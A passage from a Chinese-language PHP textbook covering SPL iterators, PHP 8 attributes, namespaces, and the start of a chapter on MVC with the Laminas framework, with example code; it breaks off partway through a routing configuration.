图 11.48 方法先被检查，然后被执行

> **注意**
> 您可以在 http://s-prs.co/v602274 上了解更多信息。

### 11.4.11 SPL

标准 PHP 库（SPL）基于 C++ 中的标准模板库（STL）。这个库是什么？它是一组用于迭代器及其他重要标准任务的明确定义的类和接口。10 `iterator` 是一种用于遍历其他元素的编程构造。最简单的迭代器类型是循环，如您在第 11.4.8 节中所见。这里我们从一个类似的示例开始，然后将其扩展以包含 SPL 功能。

10. SPL 的基础是设计模式的思想，PHP 中 SPL 之父是 Marcus Börger。

下面的示例将逗号分隔值的字符串拆分为多个单独的值并遍历它们。图 11.49 显示了该示例的输出：

```php
$text = 'comma,separated,values,in bulk';
$parts = explode(',', $text);
foreach ($parts as $value) {
    echo $value . '<br />';
}
?>
```

![](img/ae7820c36e8f24c1623d26668b28e80e_362_0.png)

图 11.49 各行中的值的输出

迭代器是 foreach 循环，它遍历由 `explode()` 创建的数组。然而，这种实现不太容易替换或更改。您对迭代器的效果也几乎没有影响。这就是为什么有迭代器接口，您可以使用它来创建自己的迭代器类。

但首先，您应该了解其背后的目标。以下代码创建 CSV 类的一个新对象。它接受逗号分隔的值。然后可以简单地使用 foreach 遍历该对象：

```php
$text = new CSV('comma,separated,values,in bulk');
foreach ($text as $key => $value) {
    echo $value . '<br />';
}
```

要实现这一点，CSV 类必须首先存在。该类实现了 IteratorAggregate 接口；也就是说，它是迭代器的集合点，随后必须在单独的类中实现。

11 在实践中，采用逗号分隔值（CSV）格式的列表非常常见。例如，Excel 依赖此类导出；许多数据库系统、网上商店、CMS 等也使用此类格式。这里我们使用简化的 CSV，不含换行符——也就是说，不区分数据库中不同的结果系列等。

12 字符串操作选项请参见第 7 章。

从原则上讲，CSV 类仅在构造函数中接受带有逗号分隔值的字符串。`getIterator()` 方法由 IteratorAggregate 提供，并实例化实际的迭代器对象：

```php
class CSV implements IteratorAggregate {
private $csv;
public function __construct($csv = '') {
$this->csv = $csv;
}

public function getIterator() {
return new CSVIterator($this->csv);
}
}
```

Iterator 对象由 CSVIterator 类实例化，您也需要自己编写该类。它实现了 PHP 预定义的 Iterator 接口。该接口中定义的方法需要 foreach 循环知道如何遍历各个值。让我们逐个方法了解这个类：

- 该类本身实现 Iterator 类。一个属性用于存储 CSV 值数组，另一个用于存储迭代器的当前位置：

```php
class CSVIterator implements Iterator {
private $csv;
private $position;
}
```

- 在构造函数中，传递的 CSV 字符串使用逗号分隔并赋值给属性：

```php
public function __construct($csv) {
$this->csv = explode(',', $csv);
}
```

- `next()` 方法控制迭代器的逐步迭代。这里，位置简单地加 1：

```php
public function next() {
$this->position += 1;
}
```

- 要返回到第一个起始位置，`rewind()` 方法将位置设置为 0：

```php
public function rewind() {
$this->position = 0;
}
```

- `key()` 返回当前位置，即数组的索引：

```php
public function key() {
return $this->position;
}
```

- `current()` 返回当前位置的值。这也是 foreach 中的值：

```php
public function current() {
    return $this->csv[$this->position];
}
```

- `valid()` 检查是否尚未到达数组的最后一个位置。它返回一个布尔值：

```php
public function valid() {
    return $this->position < count($this->csv);
}
```

以下清单显示了整个代码的概览。

```php
<?php
class CSVIterator implements Iterator {
    private $csv;
    private $position;

    public function __construct($csv) {
        $this->csv = explode(',', $csv);
    }

    public function next(): void {
        $this->position += 1;
    }

    public function rewind(): void {
        $this->position = 0;
    }

    public function key(): int {
        return $this->position;
    }

    public function current(): mixed {
        return $this->csv[$this->position];
    }

    public function valid(): bool {
        return $this->position < count($this->csv);
    }
}

class CSV implements IteratorAggregate {
    private $csv;

    public function __construct($csv = '') {
        $this->csv = $csv;
    }

    public function getIterator(): CSVIterator {
        return new CSVIterator($this->csv);
    }
}

$text = new CSV('comma,separated,values,in bulk');
foreach ($text as $key => $value) {
    echo $value . '<br />';
}
?>
```

代码清单 11.60 CSV 值的迭代器接口（"iterator_csv.php"）

输出与之前在图 11.49 中所示的简单 foreach 循环类似。

> **提示**
> 在实践中，您应将 IteratorAggregate 和 Iterator 类包含在一个或多个
> 类文件或单独的库中。此处，所有内容都在“一个”清单中，以保持
> 印刷形式的清晰度。

SPL 现在通过用于迭代器处理的其他类和接口扩展了常规迭代器接口。此外，还有其他类和接口，您可以在 www.php.net/spl 上详细了解。不过，首先请专注于迭代器处理。

SPL 有两个类，FilterIterator 和 LimitIterator，专门用于迭代器遍历期间的过滤。换句话说，它们为内部迭代器形成外部迭代器。13 要设置这样的场景，您必须稍微修改代码清单 11.60。在 CSV 类中对 `getIterator()` 的调用中，您使用外部迭代器（这里是 FilterIterator）和内部迭代器作为第一个参数。此处的第二个参数是用作过滤器的字符串：

```php
public function getIterator() {
return new CSVFilterIterator(new CSVIterator($this->csv), 'comma');
}
```

13 也可以嵌套多个迭代器。为此，将内部迭代器传递给第一个外部迭代器，然后将第一个外部迭代器作为构造函数的第一个参数传递给第二个外部迭代器。

CSVFilterIterator 类中实现了 FilterIterator。它继承自 FilterIterator，只需要一个 `accept()` 方法，您在其中执行过滤。

在构造函数中，传递内部迭代器的迭代器对象并调用构造函数。您还将过滤值保存在一个属性中：

```php
class CSVFilterIterator extends FilterIterator {
private $value;

public function __construct(CSVIterator $CSVIterator, $value) {
parent::__construct($CSVIterator);
$this->value = $value;
}
}
```

随后进行过滤。要访问内部迭代器中当前迭代的元素，请使用 `getInnerIterator()` 方法，然后使用 `current()` 获取当前元素的值（或使用 `key()` 获取位置）：

```php
public function accept() {
$ele = $this->getInnerIterator()->current();
if (strpos($ele, $this->value) !== 0) {
return true;
} else {
return false;
}
}
}
```

在这种情况下，过滤非常简单。所有带有逗号的值都被过滤掉。然而，示例非常清楚地展示了优势。您拥有一个迭代器，然后可以从外部（即使用另一个类）对其进行过滤。

以下清单显示了带有高亮 SPL 元素的完整代码。图 11.50 显示了输出。

```php
<?php
class CSVIterator implements Iterator {
private $csv;
private $position;

public function __construct($csv) {
$this->csv = explode(',', $csv);
}

public function next(): void {
$this->position += 1;
}

public function rewind(): void {
```



```php
$this->position = 0;
}
public function key(): int {
return $this->position;
}
public function current(): string {
return $this->csv[$this->position];
}
public function valid(): bool {
return $this->position < count($this->csv);
}
}
```

```php
class CSVFilterIterator extends FilterIterator {
private $value;

public function __construct(CSVIterator $CSVIterator, $value) {
parent::__construct($CSVIterator);
$this->value = $value;
}

public function accept(): bool {
$ele = $this->getInnerIterator()->current();
if (strpos($ele, $this->value) != 0) {
return true;
} else {
return false;
}
}
}
```

```php
class CSV implements IteratorAggregate {
private $csv;

public function __construct($csv = '') {
$this->csv = $csv;
}

public function getIterator(): CSVFilterIterator {
return new CSVFilterIterator(new CSVIterator($this->csv), ',');
}
}
```

```php
$text = new CSV('comma,separated,values,in bulk');

foreach ($text as $key => $value) {
    echo $value .'<br />';
}
?>
```

清单 11.61 "FilterIterator" 来自 SPL ("filteriterator_spl.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_368_0.png)

### 图 11.50 输出列表中缺少逗号

> **注意**
> 
> 其他方法根据类或接口而有所不同。例如，LimitIterator 使用 seek() 方法而不是 accept() 方法。但是，它已经知道标准行为。在构造函数中，您指定第二个参数（在内部迭代器之后），即从哪个元素开始迭代。作为第三个参数，可以指定要迭代的最大元素数量。

## SPL 的可能性

SPL 的可能性不仅限于纯迭代器过滤。事实上，这些类和接口可以应用于各个领域。以下是简要概述（更详细的描述可参见 http://s-prs.co/v602275）：

- 您已在示例中看到迭代器的用法。除了 FilterIterator 和 LimitIterator，还有几个其他迭代器，例如用于递归迭代的 RecursiveIterator。
- SPL 目前提供两个目录迭代器：一个用于遍历目录，一个用于递归遍历嵌套目录。
- SimpleXMLIterator 是 SimpleXML 的递归迭代器。
- 针对数组有合适的对象，并且可以使用迭代器和递归迭代器。Countable 接口也可以用作 count() 函数的控制级别，该函数默认计算数组的标量值。
- SPL 还实现了用于错误处理的多个类。还包含用于观察者设计模式的接口。

SPL 结构及其相关类的优点在于，迭代器是相互构建的。这样您可以从特定到通用创建自己的完整结构。

### 注意

SPL 函数非常强大，其中一些还针对特定应用进行了优化。例如，可以使用 GlobIterator 遍历文件和数据结构。SplFileObject 可以用于简化 CSV 文件的处理，如上一节所示。

以下简单示例设置分隔符和换行符，然后通过 SplFileObject 的 setCsvControl() 方法使 CSV 数据可访问。然后，数据通过 fgetcsv() 方法直接以数组形式逐行返回，如图 11.51 所示。

```php
<?php
$file = new SplFileObject('test.csv');
$separator = ';';
$wrap = "\n";
$file->setCsvControl($separator, $wrap);
echo '<pre>';
while ($file->valid()) {
    $data = $file->fgetcsv();
    var_dump($data);
    $file->next();
}
echo '</pre>';
?>
```

### 清单 11.62 通过 SPL 处理 CSV ("spl_csv.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_369_0.png)

### 图 11.51 CSV 值作为数组

### 11.4.12 带有属性的原生元数据

PHP 8 的新功能是可以直接在 PHP 中使用 *属性* 以机器可读的形式为类、方法、参数、属性和常量定义元数据。

这些属性通常称为 *注解*，源自 PHPDoc 或其他高级语言（如 C#）。最初，此功能旨在创建代码内文档，从而动态推导文档。但是，现在许多语言中也使用注解进行验证。在这方面，PHP 8 的属性比基于注释的注解更进一步。由于它们直接是语言的一部分，因此可以在运行时读取，并例如用于基于监听器的架构。Reflection API 也用于此目的。

顺便说一句，将基于注释的注解与属性组合起来仍然没有问题。只需将注释放在属性上方即可。

> **注意**
> 
> PHP 8 中属性之路充满坎坷。虽然它们的存在仍然相对明确，但未来语法却远不那么清晰。如果您有兴趣了解背景，可以在 <http://s-prs.co/v602276> 中找到原始邮件列表。

但现在来说说属性的语法。它们始终以 `#[` 开头并以 `]` 结尾。每个属性由两个组件组成：定义和使用。

定义始终使用 `Attribute` 关键字和一个相关的类。类名即属性名：

```php
#[Attribute]
class Installation {
    public function __construct(public string $value = 'Windows') {
    }
}
```

这意味着您用这些行定义了 `Installation` 属性。您使用构造函数为该属性定义一个名为 `value` 且类型为 `string` 的参数。

要现在使用该属性，请使用相同的语法，区别在于您可以插入名称并为参数的使用定义相应的值：

```php
#[Installation(value: 'Mac')]
class Computer {
}
```

参数的定义与此处的命名参数方式相同，也适用于普通函数参数。值和常量都可以用作参数：

```php
#[Installation('Mac')]
class Computer {

}
```

最后几行演示了类的情况，但方法也同样适用。再次，首先是定义：

```php
#[Attribute]
class Operation {
    public function __construct(public string $type = 'Start') {
    }
}
```

然后是使用方式：

```php
#[Operation(type: 'shutdown')]
function shutdown(int $seconds = 20) {

}
```

属性可以多次使用，也可以用于所有类型的元素，如类、方法、函数和属性。

> **注意**
> 
> 可以将属性限定为仅用于一个目的——例如，仅用于一个类、方法、函数或属性。TARGET_CLASS、TARGET_METHOD、TARGET_FUNCTION 和 TARGET_PROPERTY 常量可实现此目的。这些值在属性定义中指定：
> 
> #[Attribute(Attribute::TARGET_METHOD | Attribute::TARGET_FUNCTION)]
> 
> 此处可以使用 | 组合各种目的。如果未定义目的，默认值为 TARGET_ALL。
> 
> 默认情况下，每次使用只能定义一次属性及其一个值。您可以使用 IS_REPEATABLE 常量更改此行为：
> 
> #[Attributes(Attributes::IS_REPEATABLE)]
> 
> 例如，插入方式如下：
> 
> #[Installation('Windows')]
> #[Installation(value: 'Mac')]
> class Computer {
> 
> IS_REPEATABLE 可以与 | 以及其他常量结合使用来限定目的。

至此，属性的定义和使用介绍完毕。现在我们要通过 Reflection API 访问属性。为此的核心方法是 getAttributes()。它返回一个包含属性的数组。以下是类的调用示例：

```php
$refClass = new ReflectionClass(Computer::class);
dumpAttributes($refClass->getAttributes());
```

这提供了类的属性。在下一步中，我们访问方法并检索其属性：

```php
dumpAttributes($refClass->getMethod('shutdown')
->getAttributes(Operation::class));
```

我们使用这个简单函数进行实际输出：

```php
function dumpAttributes($attributes) {
 foreach ($attributes as $attribute) {
 var_dump($attribute->getName());
 var_dump($attribute->getArguments());
 var_dump($attribute->newInstance());
 }
}
```

下一个示例显示了带有两个属性的完整脚本。在此脚本中，我们使用严格类型（您还记得第 6 章中的内容）。例如，这意味着属性定义中的值与属性使用中的值之间的类型差异将以 TypeError 报告。

```php
<?php
declare(strict_types=1);

#[Attribute]
class Installation {
 public function __construct(public string $value = 'Windows') {
 }
}

#[Attribute]
class Operation {
 public function __construct(public string $type = 'Start') {
 }
}

#[Installation(value: 'Mac')]
class Computer {
 public function __construct(private $cpu = "The CPU") {
 echo 'The computer has ' . $cpu . '<br/>';
 }
}
```





```php
#[operation(type: 'shutdown')]
function shutdown(int $seconds = 20) {
    echo "Computer will shut down in $seconds seconds";
}

function dumpAttributes($attributes) {
    foreach ($attributes as $attribute) {
        var_dump($attribute->getName());
        var_dump($attribute->getArguments());
        var_dump($attribute->newInstance());
    }
}

$refClass = new ReflectionClass(Computer::class);

dumpAttributes($refClass->getAttributes());

echo '<br />';

dumpAttributes($refClass->getMethod('shutdown')->getAttributes(Operation::class));

?>
```

清单 11.63 利用反射 API 的属性（“attributes.php”）

![](img/ae7820c36e8f24c1623d26668b28e80e_373_0.png)

图 11.52 类的属性（顶部）和方法的属性（底部）

> **提示**
> 在此示例中，属性定义和使用被放在同一文件中以便更清晰。在实际中，两者通常通过命名空间进行分布和结构化（将在下一节中讨论）。

## 11.5 命名空间

本章包含的一个面向对象相关主题是*命名空间*：PHP 用于大型项目的一种基本核心特性。命名空间允许你更好地构建和分发代码。

让我们回顾一下 PHP 曲折的发展历史。2008 年 10 月 25 日，经过数月有时激烈的讨论后，PHP 5.3 做出了一项重大语法决策——通过 IRC 聊天媒介 14——该版本在六个月后发布。这涉及命名空间及其所需的分隔符。选择使用反斜杠（参见图 11.53）。

![](img/ae7820c36e8f24c1623d26668b28e80e_374_0.png)

图 11.53“历史性”公告：反斜杠用于命名空间

14 如果你感兴趣，可以在 https://wiki.php.net/media/rfc/php.ns.txt 找到讨论的录音。

当然，这引起了不满。一方面，反斜杠已经被使用——用于转义字符串中的特殊字符；另一方面，没有其他相关编程语言使用反斜杠作为命名空间。许多（知情不足的）观察者偏爱双冒号（::），即 OOP 中熟知的 *Paamayim Nekudotayim*。但出于技术原因，这根本行不通，因为在实践中会导致歧义。尽管对反斜杠有诸多抵制，但至少（本人认为）它比其他讨论过的方案看起来更好：

```
** ^^ %% :> :) :::
```

> **注意**
> 关于命名空间讨论的更多信息，可在 PHP 维基中找到：http://s-prs.co/v602277 和 http://s-prs.co/v602278。

### 11.5.1 为什么需要命名空间？

但是，命名空间到底是什么？命名空间是一种便于代码结构化及其分布到单独文件中的手段。PHP 过去没有命名空间，这导致，其中之一，类名变得越来越长。想象你正在为 Rheinwerk 公司工作，市场部门订购了一个新闻通讯管理模块。在这个新闻通讯管理模块中，会有一个用于管理*联系人*（即新闻通讯的接收者）的子模块。你为此子模块创建了一些 PHP 类，包括一个名为 *Person* 的类。

但在实际中，你不会将这个类称为 *person*。这是因为另一个新闻通讯管理模块负责处理创建新闻通讯的人，并且在那里也命名为 *Person*。用于此的类也称为 *Person*——但需求差异如此之大，以至于你无法在新闻通讯和接收者管理中使用同一个类。

想象一下，Rheinwerk 的网页部门也使用论坛软件。该软件用一个类来管理所有用户，这个类——猜猜看！——也叫做 *Person*。

那么，作为新闻通讯管理开发者和论坛软件开发者的你，会选择哪条路？你们都会为类分配唯一标识符。这会导致以下名称，例如：

```
Rheinwerk_Marketing_Newsletter_Contact_Management_Person
Rheinwerk_Marketing_Newsletter_Author_Management_Person
ContentManagementSystem_Forum_UserManagement_Person
```

无论编辑器是否有自动代码补全，这都难以阅读，也难以输入。

当然，你也可以冒险，简单地为类分配一个短名称——并希望该名称不会被其他软件组件使用。例如，PEAR 项目就在这方面栽了跟头，因为那里一直存在一个名为 Date 的类——在 PHP 中也是如此。猜猜最后谁赢了？没错，是早已被宣布死亡的 PEAR！PHP 在一个版本后将类 Date 重命名为 DateTime。

摆脱这一局面的一种可能方法是使用命名空间。这允许你指定一个特定区域，将相应 PHP 文件的代码置于一种命名伞形下。在这个命名空间内，你可以使用简洁明了的类名，因为相同的类名也可以在其他（自然是命名不同的）命名空间中使用。

### 11.5.2 使用命名空间

命名空间支持中最重要的关键术语是 namespace。一开始最大的危险来源是什么？namespace 必须是文件中的第一条语句（在 `<?php` 之后）。换句话说，在它之前不能有其他 PHP 代码或 HTML 输出。

namespace 之后，输入命名空间的名称。这将适用于整个 PHP 文件。这意味着，以下三种 PHP 元素随后成为命名空间的一部分，并可以通过命名空间名称来寻址（稍后详细介绍）：

- 类
- 函数
- 常量

以下清单展示了一个命名空间的简单示例。

```php
<?php
namespace myNS;

const NAME = 'Alpha';
function sayHello($name) {
    echo "Hello $name!";
}
?>
```

清单 11.64 简单命名空间（“namespace1.inc.php”）

NAME 常量和 sayHello() 函数现在都属于 myNS 命名空间。

> **提示**
> 你也可以在一个文件中使用多个命名空间。为此，只需按照以下模式插入花括号：

```php
namespace NS1 {
/* ... */
}

namespace NS2 {
/* ... */
}
```

### 11.5.3 使用命名空间

使用命名空间有几种方式。让我们从最简单、最明显的变体开始。首先，必须加载带有命名空间声明的文件：

```php
include 'namespace1.inc.php';
```

然后可以通过 `myNS\sayHello()` 寻址函数，并通过 `myNS\NAME` 寻址常量，反斜杠用作分隔符。

```php
<?php
include 'namespace1.inc.php';

myNS\sayHello(myNS\NAME);
?>
```

清单 11.65 使用命名空间（“namespace1.php”）

![](img/ae7820c36e8f24c1623d26668b28e80e_377_0.png)

图 11.54 通过命名空间问候

> **注意**
> 命名空间名称本身可以由多个单独的标识符组成，它们之间由反斜杠分隔，例如：
> `namespace Rheinwerk\Marketing\Newsletter\ContactManagement;`
> 自 PHP 8 起，命名空间名称的每个单独组件（即由反斜杠分隔的所有内容）也可以是保留字。但这属于“能做不代表必须做”的情况。

因此，使用命名空间相当简单，但众所周知，魔鬼往往藏在细节中。因为现在允许在不同命名空间中使用相同的名称，如果例如一个命名空间创建了一个在另一个命名空间或直接在 PHP 中同时实现的函数，就可能发生副作用。PHP 为此提供了一些帮助和技术。

### 11.5.4 确定当前命名空间

首先，`namespace` 关键字也可以用来获取对当前命名空间的引用——类似于 OOP 中的 `$this`，它生成对当前实例的引用，或用于当前类的 `self`。这可以如下示例所示。

```php
<?php
namespace myNS;

const NAME = 'Bravo';
function sayHello($name) { echo "Hello $name!"; }

namespace\sayHello(namespace\NAME);
?>
```

清单 11.66 “namespace”关键字（“namespace2.php”）

在清单 11.66 的代码中，`namespace` 前缀根本不是必需的，因为只有一个函数 `sayHello()` 和一个常量 `NAME`。但是，在更复杂的代码中，这种技术可能非常有用。除了 `namespace`，你也可以指定显式命名空间名称——但如果你需要更改命名空间名称，则将不得不再次调整此引用。

另一方面，如果你想访问 PHP 内置的函数、类或常量，但在当前命名空间中不小心选择了完全相同的标识符，你可以通过在其前面加上反斜杠来访问 PHP 的内部实现。假设 PHP——如同我们的 `myNS` 命名空间一样——有一个 `sayHello()` 函数，那么无论你身处哪个命名空间，都可以如下调用 PHP 函数：

`\sayHello()`

> **提示**
> 顺便说一句，如果你想将当前命名空间作为字符串，`__NAMESPACE__` 常量包含 exactly 此信息。

### 11.5.5 通过别名使用命名空间

到目前为止，我们收获不大。与名称冗长的类相比，输入工作并没有大幅减少。但是，命名空间的实际用处



当使用 `use` 关键字（自 PHP 5.3 起亦可用）时，这会变得明显。这将一个命名空间“导入”到当前文件中。但是，_导入_ 这个术语有点误导：相应的类不会自动加载，如同其他编程语言中那样。相反，仅仅是创建了一个别名或短名称，在该名称下可以访问命名空间中的类、函数和常量。

作为小示例的起点，我们继续使用 `namespace1.inc.php` 文件中清单 11.64 的命名空间。使用 `use`，我们为该命名空间创建一个别名——在我们的示例中，即 `n`:

```
use myNS as n;
```

你也可以直接 `use myNS`；这样也会创建一个别名——即 `myNS`。这里获益不多，但对于较长的命名空间名称很实用。你还记得虚构的 `Rheinwerk\Marketing\Newsletter\ContactManagement` 命名空间吗？下面这条

```
use Rheinwerk\Marketing\Newsletter\ContactManagement;
```

语句为该命名空间创建了 `contact management` 别名。

但回到我们简单的命名空间。`n` 别名可以节省几个字符的输入，如下一个清单所示。

```
<?php
include 'namespace1.inc.php';

use myNS as n;
n\sayHello(n\NAME);
?>
```

## 清单 11.67 带有别名的命名空间（"namespace3.php"）

不过，你仍然必须在命名空间别名前加上前缀。唯一的例外是，如果已导入关联命名空间，可以直接调用类。请查看下一个清单中包含命名空间的简单类声明。

```
<?php
namespace myNS;

class Greeting {
    private $name;

    function __construct($name) {
        $this->name = $name;
    }

    function sayHello() {
        echo "Hello {$this->name}!";
    }
}
?>
```

## 清单 11.68 带有类的命名空间（"namespace4.inc.php"）

如果使用 `use myNS\Greeting` 导入此命名空间，则会创建一个名为 Greeting 的别名——类似于纯命名空间。然后你可以完全不加前缀地使用它。

```
<?php
include 'namespace4.inc.php';

use myNS\Greeting;

$b = new Greeting('Charlie');
$b->sayHello();
?>
```

## 清单 11.69 类的命名空间别名（"namespace4.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_380_0.png)

### 图 11.55 类可以通过别名直接寻址

## "use" 的其他选项

PHP 逐渐引入了其他功能和扩展。首先，你也可以通过 use 导入常量和函数:

```
namespace myNS {
    const versionMajor = 8;
    const versionMinor = 3;
    function sayHello() {
        echo "Hello!";
    }
}
use const myNS\versionMajor;
use function myNS\sayHello();
```

你也可以在单个 use 语句中一次性导入多个类、常量或函数:

```
use const myNS\{versionMajor, versionMinor as minor};
```

最后，通过 use 导入一组时，可以在末尾包含一个额外的逗号，这与函数类似（参见第 6 章）。这种做法的潜在意义在代码格式化时体现出来:

```
use const myNS\{
    versionMajor,
    versionMinor,
    minor,
};
```

假设稍后又导入了一个额外的常量:

```
use const myNS\{
    versionMajor,
    versionMinor,
    minor,
    major,
};
```

只有加粗高亮的那一行是新的（因为所需的逗号之前已经存在了）。在版本管理系统中，只有这一行会显示为已更改。在纯功能方面没有区别，但这是一个小而重要的细节。

# 第 12 章

# 设计模式：MVC 等

*在编程中积累了大量经验后，某些模式会被反复使用。其中一些模式现在已经广泛采用。本章将介绍其中一些模式，并简要介绍 Laminas 框架。*

建筑与软件开发有什么关系？比乍一看可能想的要多。两者都涉及从大大小小的构建块中构建一个完整、复杂的“东西”——当然，这是有所简化的说法。如今，源自建筑的方法甚至被视为许多开发项目的核心组件。

奥地利建筑师克里斯托弗·亚历山大是 1977 年出版的《模式语言》一书的主要作者。他在这本书中（among other things）引入了模式语言的概念。模式语言包含特定领域内反复出现的问题及其适当解决方案（模式）。每个模式都有一个名称。

其背后的想法是，与其一遍又一遍地重新发明轮子，不如使用模式语言来调用一个可以反复使用的解决方案目录。为各个解决方案使用标准化术语也简化了沟通，因为所有参与者都知道某些术语的含义。亚历山大模式目录中的示例包括公交站台和排屋。

大约 10 年后，这一主题至少在科学领域被迁移到了编程。然而，这种方法直到 1994 年 Erich Gamma、Richard Helm、Ralph Johnson 和 John Vlissides 合著的《设计模式》出版后才真正成为主流。本书描述了许多可以解决软件开发设计阶段问题的模式。另一本流行的著作是 Martin Fowler 八年后出版的《企业应用架构模式》。

在科学和实践中，不同的模式有不同的表示法。然而，它们大多数的共同点在于：模式有一个名称并解决一个问题。说到科学：模式的实际有效性非常难以证明；因此，关于模式的出版物比较罕见。在这方面，使用模式总是包含一定的信念和信心。

1 本书拥有庞大的粉丝群；作者们常被亲切地称为“四人帮”。但不要想着把本书的作者称为“动态二人组”或类似的称呼。
2 其他阶段包括例如分析、实现和测试。这里也有一些模式，尤其是在上述第一阶段中。

本章选取三个示例进行介绍。由于本书专注于 PHP，我们将对这一主题仅做简要概述。然而，为了在编程语言之间架起桥梁并同时提供实用参考，我们展示了相应模式在 Laminas 框架中的使用方式。

## 12.1 Laminas

Laminas 框架是如今数不胜数的 PHP 框架之一。它经历了一段波折的历史：它始于 Zend 公司，当时该公司在 PHP 的后续开发中仍扮演着重要角色。2019 年底，代码库被转移到 GitHub 并合并到新的 Laminas 项目中。该新框架现在已在 Linux Foundation 的旗帜下找到了新家，并正在积极开发中。

始终重要的是决定是完全依赖框架还是仅使用其中的一部分，但本文不讨论此问题。相反，Laminas 作为一些设计模式的演示对象。³

![](img/ae7820c36e8f24c1623d26668b28e80e_384_0.png)

图 12.1 Laminas 的主页

3 仅从市场份额来看，Symfony 框架（https://symfony.com）是市场领导者。然而，这与本章的解释无关。

Laminas 项目网站 https://getlaminas.org 提供所有子项目的详细文档供下载（见图 12.1）。如果你感兴趣，关于 Zend Framework 的当前信息仍可在 https://framework.zend.com 上找到。

## 12.2 MVC

首先介绍的模式名为模型-视图-控制器，即 MVC。此模式在越来越多的专业 Web 应用程序中使用。虽然它也可用于较小的应用程序，但只有在超过一定规模时才真正有意义。

MVC 设计模式解决什么问题领域？Web 应用程序！通常，网站中的所有数据都包含在单个文件中：完整的 PHP 代码、包含所有数据的 HTML 结构，以及用 CSS 设计的布局。诚然，本书中的示例遵循非常相似的方法，但出于教学目的，以便你一目了然。然而，在复杂项目中，问题会迅速出现。以数据库连接为例。如果此信息直接包含在 PHP 文件中，则所有具有数据库访问功能的文件都需要它。因此，此数据通过复制和粘贴从一个文件复制到另一个文件。虽然这样做完全可行，但容易出错，如果数据库的连接信息更改，将会造成灾难。

仅凭 include 文件就可以在一定程度上解决这个问题。但是，一旦项目达到一定规模，就会出现其他令人烦恼的问题。例如，通常一个人或一个团队负责 HTML 和 CSS 界面，另一个团队负责 PHP 实现，还有一个团队负责数据库。如果数据库查询、实际逻辑以及 HTML 和 CSS 布局都在同一个文件中，那么不同的团队就会互相干扰。

一种可能的解决方案是 MVC 模式。有三个组件，各自有不同的职责（具体实现取决于所使用的技术和个人偏好）:

- **模型**
  包含应用程序数据——例如，来自数据库。模型的一种特殊形式是视图模型，专门用于视图中（见下一点）。

- **视图（呈现）**
  显示诸如模型中数据的信息。基本上由 HTML 模板组成。

- **控制器**
  接收用户的 HTTP 请求并控制各个视图。





图 12.2 展示了 MVC 的概览。该插图显示了实际中的通常结构：视图不知晓控制器，模型也不知晓其所属的视图。

![](img/ae7820c36e8f24c1623d26668b28e80e_386_0.png)

图 12.2 模型-视图-控制器模式

这种三部分划分当然最初会增加创建应用程序所需的工作量；但从长远来看，额外的工作可以通过复用的可能性来分摊。

那么，让我们使用 Laminas 框架创建一个简单的 MVC 应用程序。通过以下调用，我们安装 Laminas 的 MVC 框架（末尾的点指当前目录；你当然也可以指定其他目录）：

```
composer create-project -s dev laminas/laminas-mvc-skeleton .
```

Composer 随后会加载一整套组件并提出一些问题。第一个问题（是否要进行最小安装）回答 Y 表示是，随后的所有问题都回答 N 表示否。

在（可能新创建的）vendor 目录中，autoload.php 文件已相应准备就绪，因此以下指令可使 Laminas 在 PHP 脚本中可用（长十六进制值对你来说肯定不同，且我们不打印其前面内置的代码，该代码在旧 PHP 版本中会抛出错误）：

```
<?php

// autoload.php @generated by Composer

require_once __DIR__ . '/composer/autoload_real.php';

return ComposerAutoloaderInit50c0ec13caac948eb49f604210254756::getLoader();
```

图 12.3 展示了通过 Composer 进行的安装，图 12.4 显示了脚本调用的结果。此时，已创建完整的文件夹结构，包括一个用于视图的目录。

![](img/ae7820c36e8f24c1623d26668b28e80e_387_0.png)

图 12.3 通过脚本创建项目

![](img/ae7820c36e8f24c1623d26668b28e80e_387_1.png)

图 12.4 结果：已创建众多目录

以下命令随后在 8080 端口启动一个测试服务器：

```
composer serve
```

随后你可以直接在浏览器中测试一切是否正常：http://localhost:8080 将带你进入应用程序的起始页，如图 12.5 所示。

![](img/ae7820c36e8f24c1623d26668b28e80e_388_0.png)

图 12.5 MVC 应用程序的起始页

但现在开始实际工作。假设你想向应用程序添加一个新页面——即一个视图、一个控制器和一个关联模型。让我们从后者开始。在 MVC 应用程序中创建 module/Application/src/Model 目录，并创建一个名为 Hello-World.php 的文件，在其中输入以下清单中的代码以创建一个相当简单的类。该代码为用户生成一个个人幸运数字。

```
<?php
namespace Application\Model;

class HelloWorld {
 public $number;

 function __construct() {
 $this->number = rand(1, 49);
 }
}
?>
```

清单 12.1 模型 ("module/Application/src/Model/HelloWorld.php")

接下来是控制器。它位于 *module/Application/src/Controller* 文件夹中，相应的文件名是 *HelloWorldController.php*。你可以在此文件中创建某些操作——例如，页面被调用时的标准操作，以及用户提交表单时的另一个操作。此时，你仅使用一个标准操作（indexAction）。在其中，你从模型中检索数据并将其指定为 ViewModel（适用于视图的模型；后者尚不存在）。

```
<?php
namespace Application\Controller;

use Laminas\Mvc\Controller\AbstractActionController;
use Laminas\View\Model\ViewModel;

class HelloWorldController extends AbstractActionController
{
    public function indexAction()
    {
        $helloworld = new \Application\Model\HelloWorld();
        return new ViewModel(
            [
                "data" => $helloworld
            ]
        );
    }
}
?>
```

清单 12.2 控制器 ("module/Application/src/Controller/HelloWorldController.php")

演示部分仍缺失。这主要包含 HTML 和 CSS，但我们当然也要通过控制器输出从模型接收到的数据。以下清单中的代码属于 *module/Application/view/application/hello-world/index.phtml* 文件：

```
<div id="welcome">
<h1>Hello world!</h1>

<p>Your personal lucky number is: <b>
<?php
    echo $this->data->number;
?>
</b></p>
</div>
```

清单 12.3 演示部分（视图）("application/views/scripts/helloworld/index.phtml")

注意文件夹名称中的连字符！对于 "HelloWorld" 等大小写混合的名称，文件夹名称中会分隔各个组件。这是一种预防措施，以防 Web 服务器不区分文件和文件夹名称的大小写。

为了确保整个内容可以被调用，你仍需设置 *路由*（即 URL 到相应待调用代码的映射）。位于 *module/Application/config/module.config.php* 的文件已准备就绪，但需由你补充。以下清单中打印了完整文件，所有插入的信息均以 **粗体** 高亮显示。

```
<?php
declare(strict_types=1);

namespace Application;

use Laminas\Router\Http\Literal;
use Laminas\Router\Http\Segment;
use Laminas\ServiceManager\Factory\InvokableFactory;

return [
    'router' => [
        'routes' => [
            'home' => [
                'type' => Literal::class,
                'options' => [
                    'route' => '/',
                    'defaults' => [
                        'controller' => Controller\IndexController::class,
                        'action' => 'index',
